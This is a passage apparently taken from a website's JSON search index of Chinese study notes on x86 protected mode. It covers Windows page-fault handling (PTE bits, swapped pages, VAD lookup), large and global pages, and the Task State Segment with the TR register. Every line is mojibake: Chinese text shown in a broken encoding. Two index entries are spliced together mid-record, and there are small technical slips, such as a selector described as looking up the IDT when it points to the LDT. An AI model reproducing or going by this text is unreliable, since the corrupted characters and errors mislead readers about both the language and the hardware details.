åœ¨ç¼ºé¡µå¼‚å¸¸çš„å¤„ç†å‡½æ•°ä¸­ï¼Œæ“ä½œç³»ç»Ÿéœ€è¦åˆ¤æ–­å½“å‰å‘ç°ç¼ºé¡µåå…·ä½“æ˜¯ä»€ä¹ˆæƒ…å†µï¼Œç„¶ååœ¨åšå‡ºä¸åŒçš„å¤„ç†æ–¹å¼ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæœ‰4ç§æƒ…å†µã€‚ a. å½“å‰çº¿æ€§åœ°å€æœ‰æ•ˆï¼Œåªä¸è¿‡æ²¡æœ‰ç‰©ç†é¡µï¼Œå†…å®¹åœ¨æ–‡ä»¶ä¸­ã€‚ **æƒ…æ™¯ï¼š**å‡è®¾ç°æœ‰ä¸€ä¸ªè¿›ç¨‹Aï¼Œåœ¨çº¿æ€§åœ°å€00401234å¤„å­˜äº†ä¸ªå€¼10ï¼Œè¿™ä¸ªè¿›ç¨‹åœ¨è¿è¡Œä¸­ã€‚ç”±äºç‰©ç†å†…å­˜çš„ç´§å¼ ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†ä½¿ç”¨é¢‘ç‡ä½çš„é¡µä¸­çš„æ•°æ®å­˜åˆ°ç£ç›˜çš„æ–‡ä»¶ä¸­ï¼Œç„¶åå°†è¯¥ç‰©ç†é¡µç»™é‚£äº›ç°åœ¨æ€¥éœ€ç‰©ç†é¡µçš„è¿›ç¨‹ä½¿ç”¨ã€‚ **å…·ä½“è¿‡ç¨‹ï¼š*æ“ä½œç³»ç»Ÿå°†10è¿™ä¸ªå€¼ï¼Œå­˜åˆ°æ–‡ä»¶ä¸­ï¼Œä¿®æ”¹PTEçš„31:12é¡µé¢æ–‡ä»¶åç§»å’Œ4:1PFNï¼Œè¿™ä¸¤ä¸ªå­—æ®µä¸€èµ·æ ‡è®°äº†ä»ç‰©ç†é¡µæ¢å‡ºå†™åˆ°ç¡¬ç›˜æ–‡ä»¶ä¸­çš„æ–‡ä»¶ç´¢å¼•ã€‚Pä½ç½®0ã€‚ï¼ˆå› ä¸ºç‰©ç†é¡µæ‹¿ç»™åˆ«çš„è¿›ç¨‹ä½¿ç”¨äº†ï¼Œå¦‚æœåŸæ¥çš„PTEçš„Pä½è¿˜æ˜¯1ï¼Œå½“CPUå†æ¬¡è®¿é—®çº¿æ€§åœ°å€00401234æ—¶ï¼Œè¿™æ—¶PTEæŒ‡å‘çš„æ˜¯åˆ«äººè¿›ç¨‹çš„ç‰©ç†é¡µäº†ï¼‰ã€‚ åˆ¤æ–­å“ªä¸ªé¡µä½¿ç”¨é¢‘ç‡é«˜ï¼Œå“ªä¸ªé¡µä½¿ç”¨é¢‘ç‡ä½ï¼Œè¿™æ–¹é¢æ˜¯é¡µé¢ç½®æ¢ç®—æ³•çš„å†…å®¹ã€‚ å½“CPUé€šè¿‡çº¿æ€§åœ°å€00401234ï¼Œæ‹†åˆ†ï¼ŒæŸ¥åˆ°PTEçš„Pä½ä¸º0æ—¶ï¼Œèµ°eå·ç¼ºé¡µä¸­æ–­ï¼Œåœ¨å‡½æ•°ä¸­æ“ä½œç³»ç»Ÿçœ‹åˆ°æ­¤æ—¶çš„PTEå­—æ®µç¬¦åˆï¼ˆaï¼‰è¿™ç§æƒ…å†µï¼Œå°±çŸ¥é“ï¼Œå½“å‰çº¿æ€§åœ°å€æœ‰æ•ˆï¼Œåªä¸è¿‡æ²¡æœ‰ç‰©ç†é¡µï¼Œå†…å®¹åœ¨æ–‡ä»¶ä¸­ã€‚ **å¤„ç†æ–¹æ³•ï¼š**æ¥ä¸‹æ¥æŒ‚ç‰©ç†é¡µï¼ŒæŸ¥ç³»ç»Ÿæ–‡ä»¶ï¼Œå†å°†æ–‡ä»¶ä¸­çš„10å†™åˆ°ç‰©ç†é¡µä¸Šã€‚ CPUæ²¡å•¥æ„Ÿè§‰ï¼Œä»ç„¶æŠŠ10ç»™è¯»å‡ºæ¥äº† ã€‚ï¼ˆæ‰€ä»¥è¯´å¤„ç†è¿‡ç¨‹å¯¹CPUé€æ˜ï¼‰ b. çº¿æ€§åœ°å€æœ‰æ•ˆï¼Œåªä¸è¿‡è¿˜æ²¡åˆ†ç‰©ç†é¡µ å½“CPUé€šè¿‡çº¿æ€§åœ°å€00401234ï¼Œæ‹†åˆ†ï¼ŒæŸ¥åˆ°PTEçš„Pä½ä¸º0æ—¶ï¼Œèµ°eå·ç¼ºé¡µä¸­æ–­ï¼Œåœ¨å‡½æ•°ä¸­æ“ä½œç³»ç»Ÿçœ‹åˆ°æ­¤æ—¶çš„PTEå­—æ®µç¬¦åˆï¼ˆbï¼‰è¿™ç§æƒ…å†µï¼Œå°±çŸ¥é“ï¼Œå½“å‰çº¿æ€§åœ°å€æœ‰æ•ˆï¼Œåªä¸è¿‡è¿˜æ²¡åˆ†é…ç‰©ç†é¡µã€‚ **å¤„ç†æ–¹æ³•ï¼š**æ¥ä¸‹æ¥æŒ‚ç‰©ç†é¡µã€‚ c. æ­£åœ¨å¾€æ–‡ä»¶ä¸­å†™ å½“CPUé€šè¿‡çº¿æ€§åœ°å€00401234ï¼Œæ‹†åˆ†ï¼ŒæŸ¥åˆ°PTEçš„Pä½ä¸º0æ—¶ï¼Œèµ°eå·ç¼ºé¡µä¸­æ–­ï¼Œåœ¨å‡½æ•°ä¸­æ“ä½œç³»ç»Ÿçœ‹åˆ°æ­¤æ—¶çš„PTEå­—æ®µç¬¦åˆï¼ˆcï¼‰è¿™ç§æƒ…å†µï¼Œå°±çŸ¥é“ï¼Œå½“å‰ç‰©ç†é¡µçš„å†…å®¹æ­£åœ¨å¾€æ–‡ä»¶ä¸­å†™ã€‚ d. ä¸¤ç§æƒ…å†µï¼Œéœ€è¦å†ä½œåˆ¤æ–­ å½“CPUé€šè¿‡çº¿æ€§åœ°å€00401234ï¼Œæ‹†åˆ†ï¼ŒæŸ¥åˆ°PTEçš„Pä½ä¸º0æ—¶ï¼Œèµ°eå·ç¼ºé¡µä¸­æ–­ï¼Œåœ¨å‡½æ•°ä¸­æ“ä½œç³»ç»Ÿçœ‹åˆ°æ­¤æ—¶çš„PTEå­—æ®µç¬¦åˆï¼ˆdï¼‰è¿™ç§æƒ…å†µï¼ˆå­—æ®µå…¨æ˜¯0ï¼‰ï¼Œæ­¤æ—¶æœ‰ä¸¤ç§å¯èƒ½ï¼š å½“å‰çº¿æ€§åœ°å€åˆ†é…äº†ç‰©ç†é¡µï¼Œä½†è¿˜æ²¡æœ‰æŒ‚ è®¿é—®çš„çº¿æ€§åœ°å€æ— æ•ˆ å¦‚æœç¡®å®šæ˜¯ä¸¤ç§æƒ…å†µä¸­çš„å“ªç§ï¼ŸæŸ¥VADç»“æ„ä½“ã€‚VADåœ¨EPROCESSç»“æ„ä½“é‡Œï¼Œå®ƒä»¥äºŒå‰æ ‘çš„å½¢å¼è®°å½•äº†å½“å‰è¿›ç¨‹ç”¨æˆ·ç©ºé—´åˆ†é…çš„æ‰€æœ‰çº¿æ€§åœ°å€å ç”¨æƒ…å†µï¼Œæ¯”å¦‚1000-2000ï¼Œ4000-5000å·²åˆ†é…ã€‚ **å¤„ç†æ–¹æ³•ï¼š**æŸ¥VADï¼Œå¦‚æœå‘ç°è®¿é—®çš„çº¿æ€§åœ°å€æ˜¯æ— æ•ˆçš„ï¼ŒæŠ¥é”™0xC0000005ã€‚å¦‚æœæ˜¯è¿˜æ²¡æŒ‚ç‰©ç†é¡µçš„æƒ…å†µï¼Œå°±æŒ‚ç‰©ç†é¡µï¼Œç„¶åæ­£å¸¸è®¿é—®ã€‚ ä¸éœ€è¦å†æ·±å…¥ç»†æ‰£æ¯ä¸€ä½çš„ä½œç”¨ã€‚æœ‰å…´è¶£ï¼Œå‚è€ƒä¹¦ç±ï¼šæ½˜çˆ±æ°‘çš„ä¹¦ã€Šå†…æ ¸åŸç†å®ç°ã€‹ã€æ¯›å¾·æ“ã€Šå†…æ ¸æƒ…æ™¯åˆ†æã€‹ã€‚ é—®ï¼šè€å¸ˆPDE ps=1 P=0çº¿æ€§åœ°å€æœ‰æ•ˆä¹Ÿæ˜¯è¿™æ ·å¤„ç†çš„å— ç­”ï¼šé«˜2Gæ²¡æœ‰å¤§é¡µï¼Œç³»ç»Ÿé‡Œç»å¸¸ä½¿ç”¨çš„æ‰ä¼šç”¨å¤§é¡µ ï¼ˆæ²¡æ•´æ˜ç™½ï¼Œç³»ç»Ÿå…·ä½“æŒ‡å•¥ï¼Ÿç®—äº†ï¼Œå°±æ˜¯å¤§é¡µä¸å¸¸ç”¨çš„æ„æ€å§ï¼‰ Gä½ å­¦å®Œæ§åˆ¶å¯„å­˜å™¨ä¸TLBæ‰èƒ½è®²æ­¤å¤„ç•¥è¿‡ã€‚ã€‚ã€‚ å…¨å±€é¡µï¼ŒæŒ‡çš„æ˜¯é¡µï¼ŒPTEæœ‰Gä½ã€‚ æˆ–è€…PDEçš„PS=1ï¼Œæ­¤æ—¶PDEæŒ‡å‘å¤§é¡µï¼Œæ­¤æ—¶PDEçš„Gä½æ‰æœ‰æ„ä¹‰ã€‚ PDEï¼ŒPS=0ï¼Œæ­¤æ—¶Gä½æ²¡æ„ä¹‰ã€‚ PWTä½ å­¦å®Œæ§åˆ¶å¯„å­˜å™¨ä¸TLBæ‰èƒ½è®²æ­¤å¤„ç•¥è¿‡ã€‚ã€‚ã€‚ PCDä½ å­¦å®Œæ§åˆ¶å¯„å­˜å™¨ä¸TLBæ‰èƒ½è®²æ­¤å¤„ç•¥è¿‡ã€‚ã€‚ã€‚ æ€è€ƒé¢˜ ä¸€ä¸ªçº¿æ€§åœ°å€å¦‚æœå¯ä»¥è®¿é—®ï¼Œä¸€å®šè¦å¡«ä¸Šæ­£ç¡®çš„PDEå’ŒPTE,ä½†PDEä¸PTEæ˜¯ç‰©ç†åœ°å€ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å¡«å……ï¼Œé‚£åˆå¿…é¡»è¦é€šè¿‡çº¿æ€§åœ°å€æ‰èƒ½å»è®¿é—®,è°ä¸ºè®¿é—®PDEä¸PTEçš„çº¿æ€§åœ°å€å¡«å……äº‰å–çš„PDEä¸PTEå‘¢? è§£é‡Šï¼š æˆ‘ç°åœ¨æ˜¯æ“ä½œç³»ç»Ÿï¼Œç”¨VirtualAllocå‡½æ•°ç”³è¯·å†…å­˜åœ°å€12345000ï¼Œä¸ºäº†ä½¿çº¿æ€§åœ°å€12345000èƒ½ç”¨ï¼Œå°±è¦ç»™è¿™ä¸ªçº¿æ€§åœ°å€æŒ‚ä¸Šç‰©ç†é¡µï¼Œå³å¡«å……æœ‰æ•ˆçš„PDEå’ŒPTEã€‚PDEåœ¨PDTä¸Šï¼ŒPTEåœ¨PTTä¸Šï¼ŒPDTå’ŒPTTéƒ½æ˜¯ç‰©ç†åœ°å€ã€‚é‚£ä¹ˆï¼Œæ€ä¹ˆæ‰¾åˆ°PDTï¼Œå¡«ä¸ŠPDEï¼Ÿæ€ä¹ˆæ‰¾åˆ°PTTï¼Œå¡«ä¸ŠPTEï¼Ÿ æœ‰äººè‚¯å®šæ‹¿CR3è¯´äº‹ï¼Œè¯´CR3å­˜äº†PDTçš„åœ°å€ã€‚ä½†è¿™å­˜çš„æ˜¯ç‰©ç†åœ°å€ï¼ŒCPUå¯ä»¥è®¿é—®ç‰©ç†åœ°å€ï¼Œä½†ä»£ç ä¸­å‡ºç°çš„åœ°å€åªèƒ½æ˜¯çº¿æ€§åœ°å€ã€‚ è¯¾åç»ƒä¹  åˆ›å»º2ä¸ªè¿›ç¨‹,ä»¥é¡µä¸ºå•ä½æ‹†åˆ†0-4Gçº¿æ€§åœ°å€ã€‚ é¢˜ç›®è®¾è®¡æ„å›¾ï¼š çº¿æ€§åœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´çš„å…³ç³» ä»»ä½•ä¸€ä¸ªè¿›ç¨‹çš„çº¿æ€§åœ°å€ï¼Œå“ªé‡Œæ˜¯ä½¿ç”¨äº†çš„ï¼Œå“ªé‡Œæ˜¯æ²¡ç”¨äº†çš„ï¼Œå“ªé‡Œå’Œåˆ«çš„è¿›ç¨‹ä¸ä¸€æ ·ã€å“ªé‡Œä¸€æ · ï¼ˆâ­ï¼‰å“ªä¸ªçº¿æ€§åœ°å€åˆšå¥½å¯¹åº”PDTå’ŒPTT æ‹†å®Œçš„å‘ç°ä½2G (0-7FFFFFFFï¼‰å‡ ä¹ä¸åŒé«˜2G (80000000 - FFFFFFFF)å‡ ä¹ç›¸åŒï¼Œé«˜ä¸¤2Gä¸­æœ‰ä¸€äº›å¤§é¡µï¼Œå³4MBé¡µä¸€ä¸ªè¿›ç¨‹ä½2Gçš„å†…å­˜ç©ºé—´0-7FFFFFFFçš„å‰64Kå’Œå64kéƒ½æ˜¯æ²¡æœ‰æ˜ å°„çš„ï¼ˆçº¿æ€§åœ°å€0-00010000ä¸7FFF0000-7FFFFFFFï¼‰"},{"title":"ä»»åŠ¡æ®µ","path":"/wiki/Protected_Mode/ä»»åŠ¡æ®µ.html","content":"è¦ç‚¹å›é¡¾ åœ¨è°ƒç”¨é—¨ã€ä¸­æ–­é—¨ä¸é™·é˜±é—¨ä¸­ï¼Œä¸€æ—¦å‡ºç°æƒé™åˆ‡æ¢ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰å †æ ˆçš„åˆ‡æ¢ã€‚è€Œä¸”ï¼Œç”±äºCSçš„CPLå‘ç”Ÿæ”¹å˜ï¼Œä¹Ÿå¯¼è‡´äº†SSä¹Ÿå¿…é¡»è¦åˆ‡æ¢ã€‚ åˆ‡æ¢æ—¶ï¼Œä¼šæœ‰æ–°çš„ESPå’ŒSS(CSæ˜¯ç”±ä¸­æ–­é—¨æˆ–è€…è°ƒç”¨é—¨æŒ‡å®š)ï¼Œè¿™2ä¸ªå€¼ä»å“ªé‡Œæ¥çš„å‘¢? ç­”æ¡ˆ:TSS (Task-state segment)ï¼Œä»»åŠ¡çŠ¶æ€æ®µ. TSSçš„ç»“æ„ TSSæ˜¯ä¸€å—å†…å­˜ï¼Œå¤§å°ä¸º104å­—èŠ‚ï¼Œå†…å­˜ç»“æ„å¦‚å›¾ã€‚ä»ä¸‹å¾€ä¸Šçœ‹ï¼Œæœ€ä¸‹é¢é‚£è¡Œæ˜¯å‰4ä¸ªå­—èŠ‚ã€‚ Reservedçš„æ²¡æ³•ç”¨ï¼ŒIntelä¸å…è®¸ç”¨ã€‚ Previous Task Linkï¼šæŒ‡å‘å‰ä¸€ä¸ªä»»åŠ¡æ®µçš„é“¾æ¥ã€‚ SS0ã€ESP0æ˜¯0ç¯çš„å †æ ˆï¼ŒSS1ã€ESP1æ˜¯1ç¯çš„å †æ ˆï¼ŒSS2ã€ESP2æ˜¯2ç¯çš„å †æ ˆ.è™½ç„¶windowså’Œlinuxéƒ½æ²¡ä½¿ç”¨1ç¯å’Œ2ç¯ï¼Œä½†å¦‚æœæˆ‘ä»¬æƒ³ç”¨ï¼Œæ˜¯å¯ä»¥å»1ç¯ï¼Œç”¨1ç¯çš„å †æ ˆï¼›å»2ç¯ï¼Œç”¨2ç¯çš„å †æ ˆã€‚3ç¯åˆ‡3ç¯ï¼Œä¸æ¢å †æ ˆï¼Œæ‰€ä»¥æ²¡æœ‰ESP3ï¼ŒSS3ã€‚ åƒEDIã€ESIã€EBPã€ESPã€EBXã€EDXã€ECXã€EAXã€EFLAGSã€EIPã€CR3åœ¨å‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶å°±æ˜¯ç›´æ¥æ›¿æ¢å€¼ã€‚ ä½†æ˜¯æ®µå¯„å­˜å™¨ï¼Œå¦‚GSã€FSã€DSã€SSã€CSã€ESã€LDTRï¼Œå‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶ï¼Œæ¯”å¦‚GSï¼Œæ˜¯ç”¨TSS-GSé‡Œå­˜çš„16ä½å……å½“æ®µé€‰æ‹©å­ï¼ŒæŸ¥GDTè¡¨ï¼Œå†å¡«å……GSçš„96ä½ï¼ˆå¿˜äº†çš„è¯ç¿»å›å»çœ‹ã€Šæ®µæè¿°ç¬¦ä¸æ®µé€‰æ‹©å­ã€‹é‚£ä¸€ç« ï¼‰ã€‚ TSSé‡Œçš„LDT Segment Seletctorå­—æ®µï¼ˆLDTæ®µæè¿°ç¬¦ï¼‰ï¼Œä¹Ÿæ˜¯å­˜çš„æ®µé€‰æ‹©å­ï¼Œåªä¸è¿‡ç”¨è¿™ä¸ªæ®µé€‰æ‹©å­å»æŸ¥æè¿°ç¬¦æ—¶å¿…é¡»æ˜¯LDTç³»ç»Ÿæ®µï¼Œç„¶åå¡«å……LDTRæ®µå¯„å­˜å™¨ï¼ŒLDTR.baseå’ŒLDTR.limitæŒ‡ç¤ºäº†LDTè¡¨çš„èµ·å§‹åœ°å€å’Œå¤§å°ã€‚ è¿™é‡Œè´´å›¾å›å¿†ä¸‹ï¼š 1ä¸ªæ ¸1ä¸ªGDTè¡¨ã€‚ LDTæœ‰å¤šå°‘ä¸ªå–å†³äºæœ‰å¤šå°‘ä¸ªä»»åŠ¡ï¼Œå–å†³äºæœ‰å¤šå°‘ä¸ªTSSã€‚1ä¸ªTSSå¯¹åº”1ä¸ªTSSè¡¨ã€‚ æ‰§è¡Œè¯¸å¦‚è¿™è¡ŒæŒ‡ä»¤ï¼ŒæŸ¥çš„æ˜¯IDTè¡¨ 1mov ds,0x5c 0000 0000 0101 1100 Indexï¼š0000 0000 0101 1 TIï¼š1ï¼ŒæŸ¥LDTè¡¨ RPLï¼š00 CPUå¦‚ä½•çŸ¥é“GDTè¡¨çš„ä½ç½®ï¼ŸæŸ¥gdtrå¯„å­˜å™¨ã€‚ å¦‚ä½•çŸ¥é“LDTè¡¨çš„ä½ç½®ï¼ŸæŸ¥ldtræ®µå¯„å­˜å™¨ã€‚ å‡è®¾æœ‰100ä¸ªä»»åŠ¡ï¼Œæœ‰100ä¸ªLDTè¡¨ã€‚å‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶ï¼Œldtrçš„å€¼ä¼šæ¢ï¼Œgdträ¸æ¢ï¼ˆè·Ÿä»»åŠ¡æ²¡å…³ç³»ï¼‰ã€‚åœ¨æŸä¸ªå…·ä½“çš„æ—¶åˆ»ï¼Œldtræœ‰ä¸”ä»…æœ‰1ä¸ªå€¼ï¼Œå°±æ‰¾åˆ°äº†æ˜¯100ä¸ªLDTè¡¨ä¸­çš„å“ªä¸ªè¡¨ã€‚ åªå¯¹å•ä¸ªä»»åŠ¡æœ‰å½±å“ï¼Œè·Ÿåˆ«äººæ²¡å…³ç³»ã€‚æ‰€ä»¥å«å±€éƒ¨è¡¨ã€‚ è¿™äº›æ˜¯CPUå¯¹äºä»»åŠ¡çš„è®¾è®¡æƒ³æ³•ï¼Œä½†windowså’Œlinuxéƒ½æ²¡ç”¨LDTã€TSSï¼Œè‡ªå·±å®ç°äº†çº¿ç¨‹åˆ‡æ¢ã€‚ åœ¨16ä½çš„å®æ¨¡å¼ä¸‹ï¼Œå› ä¸ºæ®µå¯„å­˜å™¨é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥è¦é€šè¿‡ä¸åŒçš„æ®µæ¥åŒºåˆ†ä¸åŒçš„å†…å­˜åŒºåŸŸï¼Œæ®µçš„æ¦‚å¿µå¾ˆé‡è¦ã€‚ ä¸ºäº†ä¿æŒå‘ä¸‹å…¼å®¹ï¼Œè¿™ç§æ€æƒ³å»¶ç»­åˆ°32ä½ã€‚ä½†æ®µå¯„å­˜å™¨é•¿åº¦å¤Ÿé•¿ï¼Œå¯»å€ç©ºé—´å¤Ÿï¼Œè™½ç„¶å¯ä»¥ç»™ä¸åŒçš„baseï¼Œåˆ†æ®µï¼Œä½†æ²¡å¿…è¦è¿™æ ·ã€‚windowsé™¤äº†fsï¼Œå…¶ä»–æ®µå¯„å­˜å™¨baseéƒ½è®¾0ï¼Œä¹Ÿå°±æ˜¯å¹³å¦æ¨¡å¼ã€‚æ²¡å¿…è¦åˆ†é‚£ä¹ˆå¤šæ®µï¼Œæ‰€ä»¥ä¹Ÿæ²¡ç”¨LDTè¡¨äº†ã€‚ windowså‘ç”Ÿçº¿ç¨‹åˆ‡æ¢æ—¶ç›´æ¥å­˜å½“å‰å †æ ˆä¸­ï¼Œä¸ç”¨TSSï¼Œè§‰å¾—å¤ªéº»çƒ¦äº†ã€‚windowsåªç”¨äº†TSSä¸­çš„SS0å’ŒESP0 å¼€æœºæ—¶CPUè‡ªå·±ä¼šç”¨TSSï¼Œä»å®æ¨¡å¼å¼€æœºï¼Œç„¶åè½¬åˆ°ä¿æŠ¤æ¨¡å¼ TSSçš„ä½œç”¨ Intelçš„è®¾è®¡æ€æƒ³ Intelè®¾è®¡TSSçš„ç›®çš„ï¼šå®ç°â€œä»»åŠ¡åˆ‡æ¢â€ã€‚ä»»åŠ¡ä¸€åˆ‡æ¢ï¼Œæ‰§è¡Œéœ€è¦çš„ç¯å¢ƒå°±å˜äº†ï¼Œå³æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼Œéœ€è¦ä¿å­˜ä¾›ä¸‹ä¸€æ¬¡åˆ‡æ¢åˆ°è¯¥ä»»åŠ¡çš„æ—¶å€™å†æ¢å›å»é‡æ–°æ‰§è¡Œã€‚ CPUæ²¡æœ‰è¿›ç¨‹å’Œçº¿ç¨‹çš„æ¦‚å¿µï¼Œåªæœ‰ä»»åŠ¡çš„æ¦‚å¿µã€‚CPUçš„â€œä»»åŠ¡â€åœ¨æ“ä½œç³»ç»Ÿæ–¹é¢å°±æ˜¯æŒ‡â€œçº¿ç¨‹â€ã€‚æ‰€ä»¥æˆ‘ç­‰ä¸‹è®²ä»»åŠ¡ï¼Œä½ ç†è§£æˆçº¿ç¨‹ã€‚ æŠ›å¼€æ“ä½œç³»ç»Ÿä¸è¯´ï¼Œå•æ ¸CPUåŒæ—¶åªèƒ½åšä¸€ä»¶äº‹ï¼Œå› ä¸ºCPUåªæœ‰ä¸€å¥—å¯„å­˜å™¨ã€‚ä½†æˆ‘è¿˜æ˜¯æƒ³å•æ ¸CPUåŒæ—¶åšå¤šä¸ªäº‹æƒ…æ€ä¹ˆåŠï¼Ÿåˆ†æ—¶ã€‚æ¯”å¦‚ä»»åŠ¡Aè·‘ç€è·‘ç€ï¼Œç„¶åæˆ‘å°†å®ƒçš„å…¨éƒ¨å¯„å­˜å™¨éƒ½å­˜èµ·æ¥ï¼›ç„¶åå»åšä»»åŠ¡Bï¼Œåšç€åšç€ï¼Œä¿å­˜ï¼Œå†æ¢å¤åšä»»åŠ¡Aã€‚ æ‰€ä»¥ï¼ŒTSSå­˜åœ¨çš„ç›®çš„å°±æ˜¯ä¸ºäº†è®©ä¸€ä¸ªCPUå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šä¸ªä»»åŠ¡ã€‚ 1ä¸ªCPUåªæœ‰1ä¸ªTSSã€‚ æ“ä½œç³»ç»Ÿçš„è®¾è®¡æ€æƒ³ è§‰å¾—TSSä¸å¤Ÿå¥½ï¼Œæ‰€ä»¥è‡ªå·±å®ç°äº†ä¸€å¥—ä»»åŠ¡åˆ‡æ¢ï¼ˆçº¿ç¨‹åˆ‡æ¢ï¼‰ï¼ˆåé¢è¯¾ç¨‹è®²ï¼‰ TSSçš„æ„ä¹‰å°±åœ¨äºå¯ä»¥åŒæ—¶æ¢æ‰ä¸€å¤§å †å¯„å­˜å™¨ã€‚ ä¸è¦ä¸€çœ‹åˆ°TSSå°±æƒ³åˆ°ä»»åŠ¡åˆ‡æ¢ï¼Œæƒ³åˆ°TSSçš„ä½œç”¨å°±æ˜¯ä¸€æ¬¡æ€§æ¢æ‰å¤§é‡å¯„å­˜å™¨ï¼Œå°±è¡Œäº†ï¼Œä¸è¦ç»§ç»­æ‹“å±•è”æƒ³ã€‚ ä»æŸä¸ªè§’åº¦çœ‹ï¼Œæ‰€æœ‰æ±‡ç¼–æŒ‡ä»¤è¦ä¹ˆæ”¹å¯„å­˜å™¨ï¼Œè¦ä¹ˆæ”¹åœ°å€ jmpï¼Œæ”¹äº†eip jmp farï¼Œæ”¹äº†cså’Œeip callçŸ­è°ƒç”¨ï¼Œæ”¹äº†espã€eip callé•¿è°ƒç”¨ï¼Œè·¨æ®µä¸ææƒï¼Œæ”¹espã€eipã€cs callé•¿è°ƒç”¨ï¼Œè·¨æ®µå¹¶ææƒï¼Œæ”¹espã€esipã€csã€ss è°ƒç”¨é—¨ï¼š ä¸ææƒï¼šcså’Œeip ææƒï¼šssã€espã€csã€eip ä¸­æ–­é—¨ã€é™·é˜±é—¨ ä¸ææƒï¼šcsã€eflagsã€eip ææƒï¼šssã€espã€eflagã€csã€eip ä½†è¿™ç§æ–¹å¼æ¯æ¬¡æ”¹å¯„å­˜å™¨æ”¹å¾—å¤ªå°‘äº†ï¼Œæˆ‘æƒ³ä¸€æ¬¡æ€§æ¢æ‰æ‰€æœ‰å¯„å­˜å™¨ï¼Ÿ ç”¨TSS TSSå­˜åœ¨çš„ç›®çš„ï¼šæ›¿æ¢æ‰€æœ‰å¯„å­˜å™¨ã€‚ CPUå¦‚ä½•æ‰¾åˆ°TSS TSSæ˜¯ä¸€ä¸ªå†…å­˜ï¼Œä¸æ˜¯å¯„å­˜å™¨ï¼ˆä¸åœ¨CPUä¸­ï¼‰ã€‚CPUé€šè¿‡TRå¯„å­˜å™¨æ¥æ‰¾åˆ°TSSã€‚ æ®µå¯„å­˜å™¨TRï¼ˆTaskRegisterï¼‰æœ‰96ä½ï¼Œå…¶ä¸­16ä½å¯è§éƒ¨åˆ†ä¸ºé€‰æ‹©å­ï¼Œå¯ä»¥æ‰¾åˆ°GDTè¡¨ä¸­çš„ä¸€ä¸ªæ®µæè¿°ç¬¦ï¼Œé€šè¿‡è¯¥æè¿°ç¬¦åŠ è½½TRæ®µå¯„å­˜å™¨ä¸­å80ä½ã€‚TRå¯„å­˜å™¨çš„BaseæŒ‡ç¤ºäº†TSSè¡¨çš„ä½ç½®ã€‚LimitæŒ‡ç¤ºäº†TSSè¡¨æœ‰å¤šå¤§ã€‚ 123456789struct SegMent&#123; //å¯è§ WORD Selector;//16ä½Selector //ä¸å¯è§ WORD Attributes;//16ä½Attributes DWORD Base;//32ä½Base DWORD Limit;//32ä½Limit&#125; TSSæ®µæè¿°ç¬¦ç»“æ„ ä»»åŠ¡æ®µæè¿°ç¬¦æ˜¯ç³»ç»Ÿæ®µä¸­çš„ä¸€ç§ï¼ŒS=0ã€‚å…¶ä»–å°±ä¸è¯¦ç»†è®²äº†ã€‚ Typeé‡Œçš„Bä½ï¼š Bä½ å«ä¹‰ 1 å½“å‰TSSæ®µæè¿°ç¬¦å·²ç»åŠ è½½åˆ°TRå¯„å­˜å™¨ä¸­ 0 å½“å‰TSSæ®µæè¿°ç¬¦æ²¡æœ‰åŠ è½½åˆ°TRå¯„å­˜å™¨ä¸­ TRå¯„å­˜å™¨è¯»å†™ åŠ è½½TSS å°†TSSæ®µæè¿°ç¬¦åŠ è½½åˆ°TRå¯„å­˜å™¨ã€‚ æŒ‡ä»¤ï¼šLTR è¯´æ˜ï¼š ç”¨LTRæŒ‡ä»¤å»è£…è½½ï¼Œåªæ˜¯æ”¹å˜TRå¯„å­˜å™¨çš„å€¼ï¼ˆ96ä½ï¼‰ï¼Œå¹¶æ²¡æœ‰å»ä¿®æ”¹åˆ°å†…å­˜ä¸­TSSçš„å€¼ã€‚ LTRæŒ‡ä»¤åªèƒ½åœ¨ç³»ç»Ÿå±‚ä½¿ç”¨ã€‚ åŠ è½½åTSSæ®µæè¿°ç¬¦çš„çŠ¶æ€ä½ï¼ˆTypeä¸­çš„Bä½ï¼‰ä¼šå‘ç”Ÿæ”¹å˜ã€‚ è¯»TRå¯„å­˜å™¨ æŒ‡ä»¤ï¼šSTR è¯´æ˜ï¼šå¦‚æœç”¨STRå»è¯»çš„è¯,åªè¯»TRçš„16ä½ï¼Œä¹Ÿå°±æ˜¯é€‰æ‹©å­éƒ¨åˆ†ã€‚ å…³ç³»è¾¨æ TSSï¼šä¸€å—104å­—èŠ‚çš„å†…å­˜ TRæ®µå¯„å­˜å™¨ï¼šTR.baseå’ŒTR.limitä¸€èµ·æŒ‡ç¤ºäº†TSSçš„èµ·å§‹åœ°å€å’Œå¤§å°ï¼ŒTRçš„å€¼æ¥è‡ªäºGDTè¡¨çš„TSSæ®µæè¿°ç¬¦ã€‚å½“éœ€è¦æ›¿æ¢TSSæ—¶ï¼ŒCPUä¼šé€šè¿‡TRå¯„å­˜å™¨å»æ‰¾è¿™104ä¸ªå­—èŠ‚ã€‚ TSSæ®µæè¿°ç¬¦ï¼šGDTè¡¨ä¸­æ®µæè¿°ç¬¦çš„ä¸€ç§ã€‚ 1ä¸ªä»»åŠ¡å¯¹åº”1ä¸ªTSSæ®µæè¿°ç¬¦ã€‚ å®éªŒï¼šè‡ªå·±æ„é€ TSSå®ç°ä»»åŠ¡åˆ‡æ¢ å…¶å®ä¹Ÿå¯ä»¥ä»ç³»ç»Ÿè‡ªèº«çš„TSSæ®µæè¿°ç¬¦ï¼Œæ‰¾åˆ°ç³»ç»Ÿç›®å‰çš„TSSï¼Œå¤åˆ¶ä¸€ä»½ã€‚ä½†è¿™é‡Œï¼Œè¿™ä¸ªå®éªŒï¼Œæˆ‘ä»¬è‡ªå·±å†™ä¸€ä»½TSSã€‚ åˆ†æ 